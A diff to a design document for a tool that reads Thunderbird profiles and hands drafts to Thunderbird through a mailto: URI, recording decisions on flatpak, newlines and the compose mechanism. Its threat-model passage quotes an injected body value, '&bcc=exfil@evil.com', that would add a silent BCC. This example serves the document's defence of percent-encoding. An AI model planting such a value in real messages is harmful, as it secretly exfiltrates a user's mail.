@@ -54,7 +54,10 @@ Constraints given up front:
   speak IMAP/POP3/SMTP.
 - **Linux only**, matching the project's Linux-first posture.
 - **Both snap and apt installs** must be supported (profile lives in a
-  different place for each; flatpak is a third layout worth noting).
+  different place for each). **Flatpak is explicitly unsupported for now**
+  (decided 2026-07-14 — the maintainer's TB is snap, no flatpak install to
+  test against and none planned; revisit only when a real flatpak user
+  appears).
 
 ## Thunderbird storage landscape
 
@@ -267,8 +270,12 @@ Profile probed: `~/snap/thunderbird/common/.thunderbird/ql3rk8ye.default/`.
   comma inside the subject survived as one field, and punctuation
   (em-dash, period) came through intact. Only output was a harmless
   `Gtk-Message: … Not loading module "atk-bridge"` warning. Nothing is
-  sent — the user reviews and sends. (Still untested: embedding
-  **newlines** in `body` — a known `-compose` limitation; see Q8.)
+  sent — the user reviews and sends. **Newlines confirmed a hard
+  `-compose` limitation** (Q8 probe 2026-07-14: `body='A%0AB'` → the
+  literal `A%0AB`, no decode), so the compose hand-off uses a **`mailto:`
+  URI** instead — percent-decodes `%0A`→newline + `%20`→space, and
+  subject + cc + **bcc** all populate, running-instance reused (Q8
+  DECIDED).
 - **`.ics` calendar-import hand-off works** (TB 152.0, snap; Q7 probe
   2026-07-14). `thunderbird <path.ics>` opens
   TB's **"Import Calendar file" wizard** *as a new tab in the running
@@ -302,15 +309,15 @@ Profile probed: `~/snap/thunderbird/common/.thunderbird/ql3rk8ye.default/`.
 
 ### Still recalled / pending confirmation (commands 3+)
 
-- **apt/deb root:** `~/.thunderbird/<hash>.default*/`; **flatpak root:**
-  `~/.var/app/org.mozilla.Thunderbird/.thunderbird/<hash>.default*/`
-  (only the snap root is confirmed).
+- **apt/deb root:** `~/.thunderbird/<hash>.default*/` (recalled; only the
+  snap root is confirmed). **Flatpak is out of scope** (Q8 decision — no
+  install to test); its `~/.var/app/org.mozilla.Thunderbird/…` root is
+  recorded only so a future contributor with a flatpak TB knows where to
+  look.
 - **Calendar detail** — `event_start` time encoding (Gloda uses PRTime µs;
   calendar very likely the same by Mozilla convention, but unverified) +
   `_tz` handling, and how `cal_id` separates local vs. cached-CalDAV
   calendars.
-- **`-compose` newlines** — embedding real newlines in `body` (known
-  `-compose` limitation; single-line worked). Bears on Q8.
 - **Concurrency detail** — mbox read-while-TB-compacts safety.
 
 ## Open questions (list only — do not resolve here)
@@ -460,9 +467,10 @@ Take these one at a time in later sessions.
    level: **discovery never guesses** — it succeeds unambiguously, raises
    with instructions, or is explicitly overridden.
    - **Roots probed:** snap (`~/snap/thunderbird/common/.thunderbird/`,
-     confirmed) + apt (`~/.thunderbird/`, recalled). **Flatpak deferred**
-     — root recalled but unconfirmed; add when someone actually runs a
-     flatpak TB.
+     confirmed) + apt (`~/.thunderbird/`, recalled). **Flatpak
+     unsupported** (Q8 decision 2026-07-14) — not probed, no install to
+     test; revisit only when a real flatpak user appears. So discovery
+     scans exactly the snap + apt roots.
    - **Both roots exist → raise**, naming both paths and telling the user
      to delete the obsolete one. Rationale: an apt→snap migration leaves
      a stale-but-plausibly-active `~/.thunderbird` behind, so any
@@ -598,15 +606,39 @@ Take these one at a time in later sessions.
      likely doesn't — but unverified; the Q13 `thunderbird_calendar_create`
      `attendees` param waits on this.
 
-8. **Compose hand-off mechanics.** *Core mechanics confirmed* (see the
-   storage section): single-quoted `key=value` values escape correctly
-   (comma in subject + punctuation survive), snap TB reuses the running
-   instance, nothing is sent. Residual opens: embedding **newlines** in
-   `body` (known `-compose` limitation — needed for a real draft body);
-   **attachments** (`attachment=` URL/path field); **HTML vs. plain**
-   body; and the **flatpak** invocation (only snap confirmed). Also: does
-   the caller need to *find* the right binary (snap vs. apt vs. flatpak
-   `thunderbird`), mirroring the profile-discovery problem (Q3)?
+8. **Compose hand-off mechanics — DECIDED (Q8 probes 2026-07-14).**
+   Transport = a **`mailto:` URI**, not `-compose`. Both confirmed live:
+   - **mailto percent-decodes cleanly** — `thunderbird
+     'mailto:to@…?cc=…&bcc=…&subject=…&body=First%20line%0ASecond%0A%0AFourth'`
+     opened a compose window with a **4-line body** (`%0A`→newline,
+     `%20`→space, no leftover escapes), **subject** correct, and **both cc
+     and bcc populated**; reuses the running instance like `-compose`.
+   - **`-compose` cannot do multiline** — control probe: `body='First%0ASecond'`
+     rendered the **literal** `First%0ASecond`. So `-compose` is retired
+     for the hand-off, kept only as the recorded single-line precedent.
+
+   Settled sub-decisions:
+   - **Body newlines → mailto `%0A`** (the headline residual, closed).
+   - **Plain-text `body` only** — no HTML; simplest, no HTML-injection
+     surface, and the human formats in TB if wanted.
+   - **Attachments → deferred to v2/v3** — the author-not-approver draft
+     doesn't need them, and a file path/URL reintroduces the Q7
+     staging/confinement problem. Add on real demand.
+   - **Binary → `thunderbird` on `PATH`, with a `thunderbird_bin:`
+     override** mirroring Q3's `profile_dir:`. Unambiguous: Q3 already
+     raises when both snap+apt roots exist, and snap + apt each put
+     `thunderbird` on PATH (flatpak is out — see the constraints).
+   - **Flatpak invocation → moot** (flatpak unsupported for now).
+
+   **Injection defense — percent-encode every value, never concatenate.**
+   Because the transport is a URI, a naive build lets an attacker-authored
+   body smuggle extra hfields: a body containing `…&bcc=exfil@evil.com&…`
+   would add a **silent BCC** — a real exfil leg. Percent-encoding each
+   field's value (so `&`/`?`/`=`/`#`/`%`/newline all become `%XX`)
+   structurally closes it — a value can't break out into a new hfield.
+   This composes with Q10's recipient guard (Sanitizer + ASCII-only /
+   punycode reject on `to`/`cc`/`bcc`, which run *before* encoding). →
+   the gem's DESIGN.md threat model when built.
 
 9. **"Send it ourselves" — DECIDED: REJECTED; we *always* hand over to
    Thunderbird (after sanitizing), never send.** It collapses fully into #4
